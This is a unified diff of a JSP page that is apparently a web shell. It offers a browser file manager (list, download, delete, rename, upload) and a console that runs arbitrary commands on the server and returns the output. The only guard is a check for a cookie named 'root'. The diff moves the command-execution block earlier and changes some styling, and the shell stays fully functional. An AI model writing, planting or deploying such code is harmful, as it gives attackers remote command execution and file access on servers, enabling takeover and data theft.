@@ -1,38 +1,38 @@
 <%@page import="java.util.Set"%>
-<%@page import="java.util.Map.Entry"%>
+<%@page import="java.util.Date"%>
+<%@page import="java.util.List"%>
+<%@page import="java.util.Base64"%>
+<%@page import="java.util.Arrays"%>
 <%@page import="java.util.HashMap"%>
+<%@page import="java.util.Map.Entry"%>
+<%@page import="java.util.StringTokenizer"%>
+<%@page import="java.io.File"%>
 <%@page import="java.net.URI"%>
 <%@page import="java.net.URL"%>
 <%@page import="java.awt.Color"%>
 <%@page import="java.awt.Graphics"%>
-<%@page import="java.io.OutputStream"%>
-<%@page import="java.io.InputStreamReader"%>
-<%@page import="java.io.InputStream"%>
-<%@page import="java.io.DataOutputStream"%>
-<%@page import="java.io.FileOutputStream"%>
-<%@page import="java.io.BufferedReader"%>
-<%@page import="java.io.StringReader"%>
-<%@page import="java.io.DataInputStream"%>
-<%@page import="java.io.IOException"%>
-<%@page import="java.io.ByteArrayOutputStream"%>
-<%@page import="java.io.FileInputStream"%>
-<%@page import="java.io.BufferedInputStream"%>
-<%@page import="java.io.PrintWriter"%>
-<%@page import="java.io.File"%>
-<%@page import="java.util.Date"%>
-<%@page import="java.util.Arrays"%>
-<%@page import="java.util.List"%>
-<%@page import="java.util.Base64"%>
-<%@page import="java.util.StringTokenizer"%>
-<%@page import="java.awt.image.BufferedImage"%>
-<%@page import="java.text.SimpleDateFormat"%>
 <%@page import="java.net.URLDecoder"%>
 <%@page import="java.net.URLEncoder"%>
 <%@page import="java.nio.file.Files"%>
 <%@page import="java.nio.file.Paths"%>
-<%@page import="javax.imageio.ImageIO"%>
+<%@page import="java.io.IOException"%>
+<%@page import="java.io.PrintWriter"%>
+<%@page import="java.io.InputStream"%>
+<%@page import="java.io.StringReader"%>
+<%@page import="java.io.OutputStream"%>
+<%@page import="java.io.BufferedReader"%>
+<%@page import="java.io.DataInputStream"%>
+<%@page import="java.io.FileInputStream"%>
+<%@page import="java.io.DataOutputStream"%>
+<%@page import="java.io.FileOutputStream"%>
+<%@page import="java.io.InputStreamReader"%>
+<%@page import="java.io.BufferedInputStream"%>
+<%@page import="java.io.ByteArrayOutputStream"%>
 <%@page import="javax.swing.Icon"%>
+<%@page import="javax.imageio.ImageIO"%>
 <%@page import="javax.swing.ImageIcon"%>
+<%@page import="java.text.SimpleDateFormat"%>
+<%@page import="java.awt.image.BufferedImage"%>
 <%@page import="javax.swing.filechooser.FileSystemView"%>
 <%@page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
 <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
@@ -52,7 +52,7 @@
  	 body{
 		 color:black;
 		 font:18px red 微软雅黑;
-		 background-color:#FDF5E6;
+		 background-color:#FDF5E6; /* 香槟金 */
 		 background-repeat:space;
 		 background-size:100% 1920px;
 		 background-attachment:scroll;
@@ -71,8 +71,7 @@
 	 	height:21px;
 	 	color:black;
 	 	text-align:left;
-	 	padding-left:20px;
-	 	border:1px #ffd9b3 solid;
+	 	padding-left:20px;	
  	}
  	.helpDiv,.CommandDiv{
 	 	width:80%;
@@ -81,15 +80,16 @@
 	 	margin-left:10%;
 	 	margin-right:10%;
  	}
- 	textarea{
+ 	input,textarea,tr,td{
  	 	background-color: #FDF5E6;
+ 	 	border:1px #ffd9b3 solid;
  	}
   	textarea[rows='30']{
 	 	top:26px;left: 10% ;
 	 	width:79.5%;
  	}
  	textarea[rows='33']{
- 		width: 100%
+ 		width: 99.6%
  	}
  	.login{
 	  	margin-left: 38%;
@@ -115,8 +115,7 @@
  	}
 </style>
 <script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"> </script>
-<script type="text/javascript">
-     
+<script type="text/javascript">    
 	function rename(ele) {
 		var namecol=ele.parentElement.previousElementSibling.previousElementSibling.previousElementSibling
 		var showoldname=namecol.innerHTML.split(">")[1].split("<")[0]
@@ -156,7 +155,7 @@
 	}
 	function sendCommand(inx){
 		$.post("",inx.name+"="+inx.value,function(date){
-			var cmdOut=date.split('cmdStrStart')[2];
+			var cmdOut=date.split('StrSplit')[2];
 			 $(inx).next().next().html(cmdOut); 
 			 if(eval(cmdOut.substring(0,7)=='Refresh')){
 				 location.reload();
@@ -243,12 +242,19 @@
 	 	msg=rename(newname,oldname);   
 	}else if(request.getContentLengthLong()>180){
 		load(request,response);
+	}if(cmdStr!=null){ 
+		if(cmdStr.startsWith("cd")){
+			dir=cmdStr.startsWith("cd")?cmdStr.substring(3):dir;
+			System.out.println("切换目录"+dir);
+			application.setAttribute("dir", dir);
+			out.println("cmdStrStartRefresh"+msg+" cmdStrStart");
+		}
+		out.println("StrSplit"+command(cmdStr,(String)application.getAttribute("dir"))+"StrSplit");
 	}
             Cookie[] cookie = req.getCookies();
 		boolean red = false;
 		if(cookie!=null){
 			for (Cookie co : cookie) {
-				//o.append(co.getName() + co.getValue());
 				red = co.getName().equals("root");
 				if (red) {// 如果找到指定Cookie
 					//System.err.println("Cookie验证通过！当前用户："+co.getValue()+"\t身份确认");	
@@ -256,7 +262,6 @@
 				}
 			}
 		} 
-	int sessionAge=300;
  if (cookie==null||red == false) {// 如果找不到指定Cookie
 	 String formStr="<form class='login' method='post'>账号：<input type='text' name='username'><br/>密码：<input type='text' name='password'><br/><input type='submit' value='登录'></form>";
 	 request.setAttribute("form", formStr);
@@ -282,11 +287,12 @@
 	static String msg="";
 	static String tag="";
 	static String dir="";
+	static String action="";
 	static String newname="";
 	static String oldname="";
-	static String action="";
 	static String spacelength="";
 	static PrintWriter o=null;
+	static int sessionAge=300;
 	static boolean Refresh=false;
 	static HttpServletRequest req=null;
 	static HttpServletResponse res=null;
@@ -300,20 +306,20 @@
 	    String CreateTime = "<td> "+new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(file.lastModified()))+"</td>";  
 		String renameStr="<td><input type='button' onclick='rename(this)' value='重命名 '></td>";
 		String fhiddeStr="<td style='color:red'>"+(file.isHidden()?"√":"×")+"</td>";
-		String fReadsStr="<td style='color:red'>  "+(file.canRead()?"√":"×")+"</td>";
+		String fReadsStr="<td style='color:red'>"+(file.canRead()?"√":"×")+"</td>";
 		String requrlStr="<a href='"+ url+"?dir="+ encode(file.getAbsolutePath())+"&action=";
 		String fiSizeStr="<td>"+(file.length()/1024>1024?file.length()/1024/1024+"MB":file.length()/1024+"KB")+"</td>";
 		//String dirSizeStr="<td>"+(size/1024>1024?size/1024/1024+"MB":size/1024+"KB")+"</td>";
 		if(ac.equals("isRoot")){
 		    tag= "<td><a href='"+ url+"?dir="+ encode(file.getPath())+"&action=list'>"+file.getPath().substring(0, 2)+"</a></td>";
 		}else if(ac.equals("isDir")){
-		    tag= "<tr><td id='folder'><img src='"+imgencode64(file)+"'/> </td><td><a href='"+ url+"?dir="+encode(file.getPath())+"&action=list'>"+file.getName()+"</a></td>"
+		    tag= "<tr><td><img src='"+imgencode64(file)+"'/> <a href='"+ url+"?dir="+encode(file.getPath())+"&action=list'>"+file.getName()+"</a></td>"
 			     +"<td></td>"+"<td>"+requrlStr+"del'>删除  </a></td>"+renameStr+"<td></td>"+fhiddeStr+fReadsStr+CreateTime+"</tr>";
 		}else if(ac.equals("isFileDownLink")){
 		    tag= "<td>"+requrlStr+"down'>下载  </a></td><td>"+requrlStr+"del'>删除  </a></td>"
 				 +renameStr+fiSizeStr+fhiddeStr+fReadsStr+CreateTime+"</tr>";
 		}else {
-		    tag="<tr><td id='file'><img src='"+imgencode64(file)+"'/></td><td>"+requrlStr+"preview'>"+file.getName()+"</a></td>";
+		    tag="<tr><td><img src='"+imgencode64(file)+"'/>"+requrlStr+"preview'>"+file.getName()+"</a></td>";
 		}
 		return tag;
 	}
@@ -336,7 +342,8 @@
 	static String encode(String x){//url编码
 		try{
 		    x=URLEncoder.encode(x, "utf-8");
-		}catch(Exception e){}
+		}catch(Exception e){
+		}
 		return x;
 	}
 	static String decode(String x){//url解码
@@ -563,7 +570,7 @@
 			<td>
 				<form  enctype="multipart/form-data" method="post">
 					<input type="submit" value="上传至当前目录 " size="50">
-				    <input  type="file" name="file" size="30"  >  
+				    <input type="file" name="file" size="30"  >  
 				</form>
 			</td>
 			<td>
@@ -578,8 +585,7 @@
 	</div>
  <div class="fileListTable">
 	<table class="filelist">
-	 	<tr>
-			<td>类型</td>
+	 	<tr> 
 			<td>名称</td>
 			<td>下载</td>
 			<td>删除</td>
@@ -645,18 +651,11 @@
 			}
 		}
 	}
-if(cmdStr!=null){ 
-		if(cmdStr.startsWith("cd")){
-			dir=cmdStr.startsWith("cd")?cmdStr.substring(3):dir;
-			System.out.println("切换目录"+dir);
-			application.setAttribute("dir", dir);
-			out.println("cmdStrStartRefresh"+msg+" cmdStrStart");
-		}
-		out.println("cmdStrStart"+command(cmdStr,(String)application.getAttribute("dir"))+"cmdStrStart");
-	}
+
  %>
-   </table></div> 
-<div class="CommandDiv"><input type="text" name="commandStr"><input type="submit" onclick="sendCommand(this.previousSibling)"><textarea rows='33'></textarea>
+</table>
+</div> 
+	<div class="CommandDiv"><input type="text" name="commandStr" size=25><input type="submit" onclick="sendCommand(this.previousSibling)"><textarea rows='33'></textarea>
 </div>
 <div class="helpDiv" >
 <iframe src="data:text/html;charset=utf-8;base64,PHVsPjxsaT5zaGlmdCtDL0QvRS9GL0cvSCDot7PliLDlr7nlupTnm5jnrKYgPC9saT48bGk+c2hpZnQrQS82NjYg5YiH5o2i5paH5Lu25YiX6KGo5LiO5o6n5Yi25Y+wIDwvbGk+PGxpPnNoaXRmK1gg5biu5YqpPC9saT48L3VsPg==" frameborder="0"></iframe>
